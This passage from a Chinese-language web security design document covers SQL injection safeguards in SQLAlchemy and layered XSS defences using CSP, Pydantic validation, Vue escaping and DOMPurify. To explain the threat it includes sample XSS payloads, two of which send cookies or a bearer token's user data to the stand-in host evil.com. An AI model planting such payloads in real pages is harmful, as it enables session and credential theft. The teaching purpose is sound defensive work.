    select(func.count()).select_from(Order).where(Order.event_id == event_id)
)

# ✅ 安全：text() 绑定参数
session.execute(
    text("SELECT * FROM users WHERE id = :id"),
    {"id": user_id}
)

# ✅ 安全：IN 子句绑定参数
session.execute(
    text("SELECT * FROM events WHERE id IN :ids"),
    {"ids": tuple(event_ids)}  # SQLAlchemy 自动展开
)

# ✅ 安全：ORDER BY 注意！
# ORDER BY 不能使用绑定参数！
# 需要白名单校验：
allowed_sort = {"created_at", "price", "title"}
sort_by = request.query_params.get("sort", "created_at")
if sort_by not in allowed_sort:
    sort_by = "created_at"
session.execute(
    text(f"SELECT * FROM events ORDER BY {sort_by}")  # sort_by 经过白名单验证
)
```

### 11.4 XSS 防护详解

#### XSS 类型

```text
XSS（Cross-Site Scripting，跨站脚本攻击）分为三种：

1. 反射型 XSS
   恶意脚本在 URL 参数中，后端未转义直接返回到页面。
   用户点击恶意链接后，脚本在受害者浏览器中执行。
   示例：
   https://example.com/search?q=<script>alert('XSS')</script>
   如果后端将 q 参数的值直接嵌入到 HTML 响应中 → 脚本执行

2. 存储型 XSS（最危险）
   恶意脚本存储在服务器中（数据库、评论区等），
   其他用户访问包含恶意内容的页面时触发。
   示例：
   攻击者在评论区提交 <script>fetch('/api/user', {credentials:'include'})</script>
   其他用户查看该页面时 → 脚本执行 → 用户信息被盗

3. DOM 型 XSS
   恶意脚本在前端 JavaScript 中动态执行，不经过后端。
   示例：
   document.getElementById('output').innerHTML = url_params.get('message')
   url_params: ?message=<img src=x onerror=alert(1)>
```

#### 本系统的 XSS 防御

```text
防御层次：

第1层：CSP（内容安全策略）
  script-src 'self' 禁止内联脚本执行
  即使攻击者注入 <script> 标签，浏览器也不会执行

第2层：输入校验（Pydantic）
  所有用户输入通过 Pydantic schema 校验类型、长度、正则
  用户名：只允许字母、数字、下划线、中文
  邮箱：符合 email 格式
  ...

第3层：输出编码（Vue 3 模板）
  Vue 3 模板语法 {{ data }} 默认进行 HTML 转义
  <script> 会被转义为 &lt;script&gt;
  除非显式使用 v-html，否则不会执行 HTML/JS

第4层：Cookie 安全属性
  HttpOnly: JavaScript 无法读取 Cookie
  Secure: 仅 HTTPS 传输
  SameSite: 限制跨站请求携带 Cookie
```

#### XSS 具体防护代码

```python
# 后端输入校验（防御存储型 XSS）

# Pydantic schema 中的字段校验
from pydantic import BaseModel, Field, field_validator
import html


class CommentCreate(BaseModel):
    """评论创建（包含 XSS 防护）"""

    content: str = Field(..., min_length=1, max_length=1000)

    @field_validator("content")
    @classmethod
    def sanitize_content(cls, v: str) -> str:
        """
        输入清洗（作为深度防御，不依赖前端校验）

        注意：更推荐在输出端做转义（Vue 模板自动处理），
        但输入清洗可以阻止恶意内容存入数据库。
        """
        # 移除 <script> 标签及其内容
        import re
        v = re.sub(r'<script[^>]*>.*?</script>', '', v, flags=re.IGNORECASE | re.DOTALL)

        # 移除 on* 事件处理器
        v = re.sub(r'\bon\w+\s*=\s*["\']?[^"\' ]+["\']?', '', v, flags=re.IGNORECASE)

        # HTML 转义（可选，取决于输出策略）
        # v = html.escape(v)

        return v.strip()


# 前端 Vue 3 中的防护
```text

```javascript
// Vue 3 模板中的 XSS 防护

// ✅ 安全：{{ }} 自动 HTML 转义
// <div>{{ userComment }}</div>
// 输入: <script>alert('xss')</script>
// 输出: &lt;script&gt;alert('xss')&lt;/script&gt;

// ❌ 危险：v-html 会执行 HTML（除非绝对信任内容，否则不要使用）
// <div v-html="userComment"></div>
// 输入: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
// 输出: 图片加载失败 → onerror 触发 → Cookie 被盗

// ✅ 安全：需要 v-html 时，使用 DOMPurify 清洗
import DOMPurify from 'dompurify'

function sanitizeHtml(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // 只允许安全标签
    ALLOWED_ATTR: ['href'],                          // 只允许安全属性
  })
}

// 在模板中使用
// <div v-html="sanitizeHtml(userContent)"></div>

// ✅ 安全的 URL：防止 javascript: 伪协议
function safeUrl(url) {
  const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:']
  try {
    const parsed = new URL(url)
    return allowedProtocols.includes(parsed.protocol) ? url : ''
  } catch {
    return ''
  }
}
```

#### XSS 攻击场景模拟

```text
场景：攻击者在订单备注中存储恶意脚本

攻击步骤：
  1. 攻击者下单时，在备注字段输入：
     <img src=x onerror="
       fetch('/api/v1/auth/me', {headers:{Authorization:`Bearer ${localStorage.getItem('token')}`}})
       .then(r=>r.json())
       .then(d=>fetch('https://evil.com/steal?data='+JSON.stringify(d)))
     ">

  2. 备注存入数据库

  3. 管理员在后台查看订单列表

  4. 管理员浏览器：
     a. 如果使用 v-html 渲染备注 → 触发 onerror → 请求 /api/v1/auth/me
     b. 请求自动携带管理员的 Bearer Token
     c. 用户数据发送到 evil.com

本系统的防御：
  1. CSP: script-src 'self' → 内联事件处理器 onerror 被禁止
  2. Vue 3 模板 {{ }} 自动转义 → 输出为文本而非 HTML
  3. Pydantic 输入校验 → 备注字段长度限制
  4. 管理后台也使用 Vue 3 模板语法（非 v-html）
```
